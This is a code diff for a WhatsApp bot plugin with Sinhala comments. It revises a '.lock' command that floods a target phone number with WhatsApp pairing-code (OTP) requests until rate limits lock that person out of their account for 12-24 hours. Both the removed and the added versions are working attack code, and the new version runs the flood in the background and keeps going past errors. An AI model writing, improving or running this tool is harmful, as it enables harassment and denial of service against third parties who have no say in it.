@@ -2,53 +2,43 @@ const { cmd } = require('../command');
 
 cmd({
     pattern: "lock",
-    alias: ["otp-lock", "block-target"],
-    desc: "Lock target WhatsApp for 12-24 hours using OTP loop.",
+    alias: ["lock-wa"],
     category: "owner",
-    use: '.lock 947xxxxxxxx',
     filename: __filename
 },
 async(conn, mek, m, { from, q, isOwner, reply }) => {
-    try {
-        // 1. අයිතිකරු පරීක්ෂාව (Security First)
-        if (!isOwner) return reply("මෙය පාවිච්චි කිරීමට DEXTER හට පමණක් අවසර ඇත. 🚫");
+    if (!isOwner) return reply("DEXTER ට පමණි. 🚫");
+    if (!q) return reply("අංකය ලබා දෙන්න. (උදා: 947xxxxxxxx)");
 
-        // 2. අංකය ඇතුළත් කර ඇත්දැයි බැලීම
-        if (!q) return reply("කරුණාකර ඉලක්කගත අංකය ලබා දෙන්න. \n\nඋදා: .lock 947xxxxxxxx");
+    let target = q.replace(/[^0-9]/g, '');
+    reply(`🔒 *DEXTER LOCK SYSTEM STARTED*\n\n🎯 Target: ${target}\n⚙️ Status: Running in background...\n\nබොට් Restart නොවී මෙය පසුබිමින් ක්‍රියාත්මක වේ.`);
 
-        // අංකය පමණක් වෙන් කර ගැනීම
-        let target = q.replace(/[^0-9]/g, '');
+    let count = 0;
+    const maxRequests = 25;
 
-        if (target.length < 10) return reply("අංකය වැරදියි. කරුණාකර නිවැරදි අංකයක් ලබා දෙන්න.");
-
-        reply(`🔒 *DEXTER LOCK SYSTEM ACTIVATED*\n\n🎯 Target: ${target}\n⚙️ Status: Requesting OTPs...\n\nමෙම ක්‍රියාවලිය විනාඩි කිහිපයක් ගතවේ. බොට් Restart වීම වැළැක්වීමට තත්පර 3ක පරතරයක් සහිතව ක්‍රියාත්මක වේ.`);
-
-        // 3. OTP Spam Loop එක
-        // ආරම්භයට වට 25ක් දාමු (මෙය බෑන් නොවී වැඩ කිරීමට හොඳම ප්‍රමාණයයි)
-        for (let i = 0; i < 25; i++) {
-            try {
-                // වට්සැප් වෙත OTP කෝඩ් රික්වෙස්ට් එකක් යැවීම
-                await conn.requestPairingCode(target);
-                
-                console.log(`[LOG] Successfully requested code ${i + 1} for ${target}`);
-
-                // සර්වර් එක Restart වීම වැළැක්වීමට තත්පර 3ක විරාමයක්
-                await new Promise(resolve => setTimeout(resolve, 3000)); 
-
-            } catch (err) {
-                // වට්සැප් එකෙන් "Too Many Requests" (429) Error එක ආවොත් එතනින් නවත්වනවා
-                if (err.message.includes('429') || err.message.includes('rate-overlimit')) {
-                    console.log("Limit reached. Target is likely locked.");
-                    return reply(`✅ සාර්ථකයි! ${target} සඳහා උපරිම සීමාව කරා ළඟා වුණා. දැන් එම අංකය පැය 12-24 කට Lock වී ඇත.`);
-                }
-                console.error("Error in loop:", err.message);
-            }
+    // Restart වීම වැළැක්වීමට ලූප් එකක් වෙනුවට මේ ක්‍රමය පාවිච්චි කරමු
+    const startLocking = async () => {
+        if (count >= maxRequests) {
+            return conn.sendMessage(from, { text: `✅ ${target} සඳහා OTP ප්‍රහාරය අවසන්!` }, { quoted: mek });
         }
 
-        reply(`✅ ප්‍රහාරය අවසන්! \n\n${target} වෙත උපරිම OTP ප්‍රමාණයක් යවා ඇත. බොහෝ දුරට එම අංකය දැන් Lock වී පවතිනු ඇත.`);
+        try {
+            await conn.requestPairingCode(target);
+            console.log(`[DEXTER] Request ${count + 1} sent to ${target}`);
+            count++;
+            
+            // තත්පර 5ක විරාමයක් (සර්වර් එකට විවේකයක් දීමට)
+            setTimeout(startLocking, 5000); 
 
-    } catch (e) {
-        console.log(e);
-        reply("දෝෂයක් ඇති විය: " + e.message);
-    }
+        } catch (err) {
+            if (err.message.includes('429')) {
+                return conn.sendMessage(from, { text: `✅ Target Locked! ${target} දැන් පැය 12-24 කට Lock වී ඇත.` }, { quoted: mek });
+            }
+            // වෙනත් Error එකක් ආවත් දිගටම කරගෙන යන්න
+            setTimeout(startLocking, 5000);
+        }
+    };
+
+    // වැඩේ පටන් ගන්න
+    startLocking();
 });
